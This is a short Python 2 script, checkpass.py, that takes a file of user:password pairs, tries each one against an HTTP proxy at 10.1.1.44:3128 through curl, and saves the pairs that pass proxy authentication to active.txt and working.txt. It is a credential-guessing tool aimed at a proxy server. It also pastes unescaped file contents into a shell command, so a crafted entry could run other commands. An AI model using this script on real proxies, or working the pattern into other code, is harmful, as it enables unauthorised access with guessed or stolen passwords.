import commands,sys,os
try:
    data=open(sys.argv[1],"r")
except IndexError:
    print "checkpass.py <passwords.txt>"
    exit(1)
active=open("active.txt","w")
working=open("working.txt","w")
b=data.read()
passwds = b.split("\n")
del passwds[-1]
c=0

for i in passwds:
    proxy="http://"+i+"@10.1.1.44:3128/"
    a=commands.getstatusoutput("curl --proxy "+proxy+" --head http://www.google.co.in")
    statusCode = a[1].split("\n")[3].split()[1]
    if  statusCode != "407":
        if statusCode == "200":
		c+=1
		active.write(i+"\n")
	working.write(i+"\n")
    	print "[+] "+i[0:7]+" "+statusCode
os.system('notify-send "Total Active" "Counts: '+str(c)+'"')
